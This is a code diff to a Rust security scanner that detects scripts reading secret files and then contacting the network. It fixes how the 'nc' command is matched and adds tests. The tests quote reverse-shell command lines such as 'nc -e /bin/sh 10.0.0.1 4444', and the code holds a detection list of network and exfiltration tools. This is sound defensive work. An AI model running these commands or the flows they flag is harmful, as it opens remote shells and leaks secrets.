@@ -87,14 +87,23 @@ const READ_VERBS: &[&str] = &[
     "load_dotenv",
 ];
 
-const NETWORK_VERBS: &[&str] = &[
+/// `true` when `line` (already lowercased) contains a standalone `nc`
+/// command — either at line start (`nc -lvp 4444`) or mid-line
+/// (`echo x | nc -l 4444`). The bare substring `" nc "` was previously
+/// used, which failed to match `nc` at column 0 because there is no
+/// leading space. Both positions must be checked to cover reverse-shell
+/// invocations that start a line with `nc`.
+fn line_starts_or_contains_nc(line: &str) -> bool {
+    line.starts_with("nc ") || line.contains(" nc ")
+}
+
+const NETWORK_VERB_SUBSTRINGS: &[&str] = &[
     "curl ",
     "wget ",
     "fetch(",
     "axios",
     "requests.",
     "invoke-webrequest",
-    " nc ",
     "ncat ",
     "webhook",
     "telegram.org",
@@ -144,7 +153,9 @@ pub(crate) fn detect_file_secret_to_network_flow(
     for read_idx in &read_indices {
         let end = (read_idx + TAINT_WINDOW_LINES).min(lines.len() - 1);
         for follow_line in &lines[*read_idx..=end] {
-            if NETWORK_VERBS.iter().any(|v| follow_line.contains(v)) {
+            if NETWORK_VERB_SUBSTRINGS.iter().any(|v| follow_line.contains(v))
+                || line_starts_or_contains_nc(follow_line)
+            {
                 return vec![
                     Finding::builder(
                         "SCRIPT_FILE_SECRET_TO_NETWORK_FLOW",
@@ -289,14 +300,11 @@ mod tests {
 
     /// # Contract (negative)
     ///
-    /// `NETWORK_VERBS` uses substring matching (`line.contains(v)`), so
-    /// entries MUST include word-boundary spaces. Pre-fix `"nc "` (no
-    /// leading space) matched `func `, `prince `, `lance `, `bounce `,
-    /// `influence `, etc. — any identifier ending in `nc` followed by a
-    /// space. The leading space `" nc "` ensures only the standalone
-    /// `nc` command matches, while still matching `nc` at line start
-    /// (e.g. `nc -lvp 4444`) because `line.contains(" nc ")` handles
-    /// mid-line usage and the detector is called per-line.
+    /// `NETWORK_VERB_SUBSTRINGS` uses substring matching (`line.contains(v)`)
+    /// and must not match benign text containing the substring "nc" like
+    /// `func`, `prince`, `bounce`, `influence`. The `nc` command is checked
+    /// separately via `line_starts_or_contains_nc` which requires `nc ` at
+    /// column 0 or preceded by a space.
     #[test]
     fn network_verbs_nc_does_not_match_substrings() {
         for benign in [
@@ -306,11 +314,38 @@ mod tests {
             "result = influence(decision)\n",
         ] {
             let lower = benign.to_ascii_lowercase();
-            let matches = NETWORK_VERBS.iter().any(|v| lower.contains(v));
+            let matches = NETWORK_VERB_SUBSTRINGS.iter().any(|v| lower.contains(v))
+                || line_starts_or_contains_nc(&lower);
             assert!(
                 !matches,
-                "NETWORK_VERBS must not match substring 'nc' in benign text: {benign:?}"
+                "must not match substring 'nc' in benign text: {benign:?}"
             );
         }
+    }
+
+    /// # Contract (positive)
+    ///
+    /// `nc` at line start MUST be detected. Pre-fix `" nc "` only matched
+    /// mid-line because there is no leading space at column 0, so a
+    /// reverse shell `nc -lvp 4444` starting a line was invisible.
+    #[test]
+    fn network_verbs_nc_matches_at_line_start() {
+        for line in ["nc -lvp 4444", "nc -e /bin/sh 10.0.0.1 4444"] {
+            assert!(
+                line_starts_or_contains_nc(line),
+                "nc at line start must match: {line:?}"
+            );
+        }
+    }
+
+    /// # Contract (positive)
+    ///
+    /// `nc` mid-line (piped) MUST still be detected.
+    #[test]
+    fn network_verbs_nc_matches_mid_line() {
+        assert!(
+            line_starts_or_contains_nc("echo x | nc 10.0.0.1 4444"),
+            "nc mid-line must match"
+        );
     }
 }
